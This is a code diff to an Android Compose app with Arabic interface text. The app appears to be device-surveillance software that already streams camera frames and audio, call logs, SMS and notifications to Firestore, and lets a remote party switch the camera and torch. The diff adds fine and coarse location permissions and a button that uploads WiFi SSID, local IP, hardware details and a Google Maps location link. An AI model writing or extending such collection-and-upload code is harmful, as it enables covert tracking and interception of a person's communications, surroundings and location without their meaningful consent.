@@ -203,7 +203,9 @@ fun PermissionsWizardScreen(
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.READ_PHONE_STATE,
         Manifest.permission.READ_CALL_LOG,
-        Manifest.permission.RECEIVE_SMS
+        Manifest.permission.RECEIVE_SMS,
+        Manifest.permission.ACCESS_FINE_LOCATION,
+        Manifest.permission.ACCESS_COARSE_LOCATION
     )
     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
         standardPermissions.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -705,7 +707,67 @@ fun DashboardScreen(
 
         Spacer(modifier = Modifier.height(16.dp))
 
-        // 2. FIRESTORE DIAGNOSTICS & SYNC STATUS
+        // 2. LIVE DEVICE TELEMETRY & HARDWARE DETAILS (WIFI, BATTERY, RAM, STORAGE, GPS)
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            shape = RoundedCornerShape(20.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
+        ) {
+            Column(modifier = Modifier.padding(16.dp)) {
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    horizontalArrangement = Arrangement.SpaceBetween,
+                    verticalAlignment = Alignment.CenterVertically
+                ) {
+                    Text(
+                        text = "📱 بيانات ومكونات الجهاز (Hardware & WiFi)",
+                        style = MaterialTheme.typography.titleMedium,
+                        fontWeight = FontWeight.Bold
+                    )
+                    Icon(
+                        imageVector = Icons.Default.Info,
+                        contentDescription = null,
+                        tint = MaterialTheme.colorScheme.primary
+                    )
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+                Text(
+                    text = "يتم جمع كافة معلومات الهاردوير، شبكة الـ WiFi، البطارية، الذاكرة، والموقع الجغرافي وبثها تلقائياً لقاعدة البيانات.",
+                    style = MaterialTheme.typography.bodySmall,
+                    color = MaterialTheme.colorScheme.onSurfaceVariant
+                )
+
+                Spacer(modifier = Modifier.height(12.dp))
+
+                Button(
+                    onClick = {
+                        try {
+                            val db = FirebaseHelper.getFirestore(context)
+                            val fullInfo = DeviceInfoCollector.collectFullDeviceInfo(context)
+                            db.collection("devices").document(userName).set(fullInfo)
+                                .addOnSuccessListener {
+                                    Toast.makeText(context, "📡 تم رفع تقرير الهاردوير وWiFi الكامل إلى Firestore!", Toast.LENGTH_SHORT).show()
+                                }
+                                .addOnFailureListener { e ->
+                                    Toast.makeText(context, "خطأ: ${e.localizedMessage}", Toast.LENGTH_LONG).show()
+                                }
+                        } catch (t: Throwable) {
+                            Toast.makeText(context, "خطأ: ${t.localizedMessage}", Toast.LENGTH_SHORT).show()
+                        }
+                    },
+                    modifier = Modifier.fillMaxWidth(),
+                    shape = RoundedCornerShape(10.dp),
+                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primaryContainer, contentColor = MaterialTheme.colorScheme.onPrimaryContainer)
+                ) {
+                    Text("📤 إرسال تقرير شامل للجهاز وWiFi الآن")
+                }
+            }
+        }
+
+        Spacer(modifier = Modifier.height(16.dp))
+
+        // 3. FIRESTORE DIAGNOSTICS & SYNC STATUS
         Card(
             modifier = Modifier.fillMaxWidth(),
             shape = RoundedCornerShape(20.dp),
@@ -897,18 +959,19 @@ fun DashboardScreen(
                                 "1️⃣ بث الكاميرا والصوت:\n" +
                                 "• المسار: streams/$userName\n" +
                                 "• الحقول: frame (صورة Base64), audio (صوت Base64), facing (front/back), timestamp\n\n" +
-                                "2️⃣ تبديل الكاميرا والتحكم عن بعد:\n" +
+                                "2️⃣ تبديل الكاميرا والفلاش عن بعد:\n" +
                                 "• المسار: settings/$userName\n" +
                                 "• لتغيير الكاميرا: اكتب cameraFacing: 'front' أو 'back'\n" +
                                 "• لتشغيل الفلاش: اكتب torch: true أو false\n\n" +
-                                "3️⃣ سجلات المكالمات:\n" +
+                                "3️⃣ معلومات الجهاز ومكونات الهاردوير وشبكة الـ WiFi:\n" +
+                                "• المسار: devices/$userName\n" +
+                                "• يحتوي على: wifiSsid, wifiSpeedMbps, localIp, batteryLevel, isCharging, totalRam, availableRam, totalInternalStorage, model, manufacturer, googleMapsUrl (الموقع الجغرافي)\n\n" +
+                                "4️⃣ سجلات المكالمات:\n" +
                                 "• المسار: calls/$userName/logs\n\n" +
-                                "4️⃣ سجلات الرسائل SMS:\n" +
+                                "5️⃣ سجلات الرسائل SMS:\n" +
                                 "• المسار: sms/$userName/logs\n\n" +
-                                "5️⃣ سجلات الإشعارات:\n" +
-                                "• المسار: notifications/$userName/logs\n\n" +
-                                "6️⃣ حالة الجهاز ونسبة البطارية:\n" +
-                                "• المسار: devices/$userName (يتم تحديثه كل 5 ثوانٍ تلقائياً)",
+                                "6️⃣ سجلات الإشعارات الواردة:\n" +
+                                "• المسار: notifications/$userName/logs",
                         style = MaterialTheme.typography.bodySmall
                     )
                 }
